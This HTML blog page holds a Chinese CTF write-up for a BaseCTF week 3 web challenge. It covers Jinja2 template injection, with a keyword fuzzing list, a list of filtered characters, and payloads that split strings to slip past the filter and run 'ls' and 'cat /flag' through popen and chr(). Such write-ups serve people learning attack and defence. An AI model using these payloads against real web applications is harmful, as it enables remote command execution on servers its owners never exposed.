<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>BaseCTF wp(week3) | sh1ro的个人小站</title><meta name="author" content="sh1ro"><meta name="copyright" content="sh1ro"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="BaseCTF wp(week3)WEB复读机老演员了（） fuzz测一下过滤了啥，详细说一下测试过程，防止自己忘记怎么测的了，下面是测试位置  贴一个测试字典（个人总结，不一定好用） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758">
<meta property="og:type" content="article">
<meta property="og:title" content="BaseCTF wp(week3)">
<meta property="og:url" content="http://example.com/2024/09/11/BaseCTF-week3/index.html">
<meta property="og:site_name" content="sh1ro的个人小站">
<meta property="og:description" content="BaseCTF wp(week3)WEB复读机老演员了（） fuzz测一下过滤了啥，详细说一下测试过程，防止自己忘记怎么测的了，下面是测试位置  贴一个测试字典（个人总结，不一定好用） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/92298341_p0.jpg">
<meta property="article:published_time" content="2024-09-11T05:30:15.000Z">
<meta property="article:modified_time" content="2024-09-11T05:40:25.806Z">
<meta property="article:author" content="sh1ro">
<meta property="article:tag" content="BaseCTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/92298341_p0.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://example.com/2024/09/11/BaseCTF-week3/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'BaseCTF wp(week3)',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-11 13:40:25'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/modify.styl"><link rel="stylesheet" href="/css/daohanglan.css"><link rel="stylesheet" href="/css/runtime.css"><link rel="stylesheet" href="/css/copyright.css"><link rel="stylesheet" href="https://cdn2.codesign.qq.com/icons/XMx86jzlQw0brz3/latest/iconfont.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css">
<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="icat_menus_item"><a class="site-page" href="/"></a></div><div class="icat_menus_item"><a class="site-page" href="/links/"></a></div><div class="icat_menus_item"><a class="site-page" href="/comment/"></a></div><div class="icat_menus_item"><a class="site-page" href="/about/"></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/92298341_p0.jpg')"><nav id="nav"><div id="nav-group"><span id="blog-info"><a href="/" title="回到主页"><span class="site-name"></span></a></span><div id="menus"><div class="menus_items"><div class="icat_menus_item"><a class="site-page" href="/"></a></div><div class="icat_menus_item"><a class="site-page" href="/links/"></a></div><div class="icat_menus_item"><a class="site-page" href="/comment/"></a></div><div class="icat_menus_item"><a class="site-page" href="/about/"></a></div></div></div><div id="nav-right"><div id="travellings"><a class="site-page" target="_blank" rel="noopener" href="https://travellings.cn/go.html" title="随机前往一个开往项目网站"><i class="iconfont icat-subway"></i></a></div><div id="random"><a class="site-page" href="javascript:toRandomPost()" title="随机前往一个文章"><i class="iconfont icat-random"></i></a></div><div id="search-button"><a class="site-page social-icon search"><i class="iconfont icat-search"></i></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="搜索本站文章"><i class="iconfont icat-bars"></i></a></div></div></div></nav><div id="post-info"><h1 class="post-title">BaseCTF wp(week3)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-11T05:30:15.000Z" title="发表于 2024-09-11 13:30:15">2024-09-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-11T05:40:25.806Z" title="更新于 2024-09-11 13:40:25">2024-09-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="BaseCTF wp(week3)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('/img/92298341_p0.jpg');"></div><article class="post-content" id="article-container"><h1 id="BaseCTF-wp-week3"><a href="#BaseCTF-wp-week3" class="headerlink" title="BaseCTF wp(week3)"></a>BaseCTF wp(week3)</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="复读机"><a href="#复读机" class="headerlink" title="复读机"></a>复读机</h3><p><del>老演员了（）</del></p>
<p>fuzz测一下过滤了啥，详细说一下测试过程，防止自己忘记怎么测的了，下面是测试位置</p>
<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/09/11/BaseCTF-week3/image-20240908150406865-17260327135671.png" alt="image-20240908150406865"></p>
<p>贴一个测试字典（个人总结，不一定好用）</p>
<figure class="highlight asciidoc"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">.</span></span><br><span class="line"><span class="bullet"></span>[</span><br><span class="line">]</span><br><span class="line">_</span><br><span class="line">{</span><br><span class="line">}</span><br><span class="line">{{</span><br><span class="line">}}</span><br><span class="line">{%</span><br><span class="line">%}</span><br><span class="line">{%if</span><br><span class="line">{%endif</span><br><span class="line">{%print(</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">0</span><br><span class="line">'</span><br><span class="line">"</span><br><span class="line">+</span><br><span class="line">%2B</span><br><span class="line">%2b</span><br><span class="line">join()</span><br><span class="line">u</span><br><span class="line">os</span><br><span class="line">popen</span><br><span class="line">importlib</span><br><span class="line">linecache</span><br><span class="line">subprocess</span><br><span class="line">|attr()</span><br><span class="line">request</span><br><span class="line">args</span><br><span class="line">value</span><br><span class="line">cookie</span><br><span class="line"><span class="emphasis">__getitem__</span>()</span><br><span class="line"><span class="emphasis">__class__</span></span><br><span class="line"><span class="emphasis">__base__</span></span><br><span class="line"><span class="emphasis">__bases__</span></span><br><span class="line"><span class="emphasis">__mro__</span></span><br><span class="line"><span class="emphasis">__subclasses__</span>()</span><br><span class="line"><span class="emphasis">__builtins__</span></span><br><span class="line"><span class="emphasis">__init__</span></span><br><span class="line"><span class="emphasis">__globals__</span></span><br><span class="line"><span class="emphasis">__import__</span></span><br><span class="line"><span class="emphasis">__dic__</span></span><br><span class="line"><span class="emphasis">__getattribute__</span>()</span><br><span class="line"><span class="emphasis">__getitem__</span>()</span><br><span class="line"><span class="emphasis">__str__</span>()</span><br><span class="line">lipsum</span><br><span class="line">current_app</span><br><span class="line">/</span><br><span class="line">\</span><br><span class="line">+</span><br><span class="line"><span class="bullet">-</span></span><br><span class="line"><span class="bullet"></span><span class="bullet">*</span></span><br><span class="line"><span class="bullet"></span>'</span><br><span class="line">"</span><br><span class="line">base</span><br></pre></td></tr></tbody></table></figure>

<p>这里发现它过滤了</p>
<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/09/11/BaseCTF-week3/image-20240911133741843.png" alt="image-20240911133741843"></p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/09/11/BaseCTF-week3/image-20240908150822508-17260327135683.png" alt="image-20240908150822508" style="zoom:50%;">

<p>由于ssti中关键字都需要双大括号解析，如过不能解析则测不到实际的过滤，所以这里及时替换测试方法，采用</p>
<figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="meta">%</span><span class="meta">%</span>}</span><br></pre></td></tr></tbody></table></figure>

<p>来代替解析关键字（后续配合print使用）</p>
<p>结果如下，返回包长度为205的全部都是过滤的关键字符</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/09/11/BaseCTF-week3/image-20240908151426279-17260327135682.png" alt="image-20240908151426279" style="zoom:50%;">

<p>分析过滤结果，对我们实际寻找利用类和最终rce有影响的过滤字符如下</p>
<figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base <span class="punctuation">+</span> <span class="punctuation">-</span> * / \ <span class="string">" . {{}} : __ </span></span><br></pre></td></tr></tbody></table></figure>

<p>以及几乎所有的关键字都被过滤了(还过滤了pop，在后面用’’分割字符串时注意)</p>
<p>结合题目思考，使用这条链子去rce比较好</p>
<figure class="highlight handlebars"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">BaseCTF</span><span class="template-variable">{{<span class="name">"".__class__.__bases__</span>[0].__subclasses__()[132].__init__.__globals__['popen'](<span class="name">'cat /flag'</span>).read()}}</span></span><br></pre></td></tr></tbody></table></figure>

<p>接下来根据过滤开始绕过</p>
<figure class="highlight mel"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF{%print(<span class="string">""</span>.__class__)%}</span><br></pre></td></tr></tbody></table></figure>

<p>过滤双引号，可用单引号绕过；过滤点，可用中括号绕过;过滤__和关键词，可用’’拼接</p>
<figure class="highlight mel"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF{%print(<span class="string">''</span>[<span class="string">'_'</span><span class="string">'_cla'</span><span class="string">'ss_'</span><span class="string">'_'</span>])%}</span><br></pre></td></tr></tbody></table></figure>

<p>接下来就是构造利用链寻找可利用类，通过脚本来寻找rce类&lt;class ‘os._wrap_close’&gt;，位置在137（此处引号分割字符串popen要分成po’’pen，以避免被检测为pop）</p>
<figure class="highlight mel"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF{%print(<span class="string">''</span>[<span class="string">'_'</span><span class="string">'_cla'</span><span class="string">'ss_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_ba'</span><span class="string">'se_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_subcl'</span><span class="string">'asses_'</span><span class="string">'_'</span>]()[<span class="number">137</span>][<span class="string">'_'</span><span class="string">'_in'</span><span class="string">'it_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_glo'</span><span class="string">'bals_'</span><span class="string">'_'</span>][<span class="string">'po'</span><span class="string">'pen'</span>](<span class="string">'ls'</span>)[<span class="string">'re'</span><span class="string">'ad'</span>]())%}</span><br></pre></td></tr></tbody></table></figure>

<p>可以看到成功执行</p>
<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/09/11/BaseCTF-week3/image-20240908155203425-17260327135684.png" alt="image-20240908155203425"></p>
<p>到了这一步了，发现rce里面的斜杠和反斜杠都被过滤了，由于反斜杠的过滤，八进制十六进制极限命令执行啥的都不行；过滤了base，封死了想通过base写马进服务器的这条路，所以我们还是回到最初的起点，想办法构造斜杠</p>
<p>一共有三种方法</p>
<p>方法一：通过chr()构造</p>
<p><del>比赛的时候找不到chr函数，悲催了</del></p>
<figure class="highlight twig"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">BaseCTF</span><span class="template-tag">{%</span> <span class="name">set</span> chr= <span class="string">''</span>[<span class="string">'_'</span><span class="string">'_cla'</span><span class="string">'ss_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_ba'</span><span class="string">'se_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_subcl'</span><span class="string">'asses_'</span><span class="string">'_'</span>]()[<span class="number">137</span>][<span class="string">'_'</span><span class="string">'_in'</span><span class="string">'it_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_glo'</span><span class="string">'bals_'</span><span class="string">'_'</span>][<span class="string">'_'</span><span class="string">'_buil'</span><span class="string">'tins_'</span><span class="string">'_'</span>][<span class="string">'chr'</span>]<span class="template-tag">%}</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">{%</span> <span class="name">print</span>(chr(<span class="number">47</span>)) <span class="template-tag">%}</span></span><br></pre></td></tr></tbody></table></figure>

<p>这样子就凑了个斜杠出来啦</p>
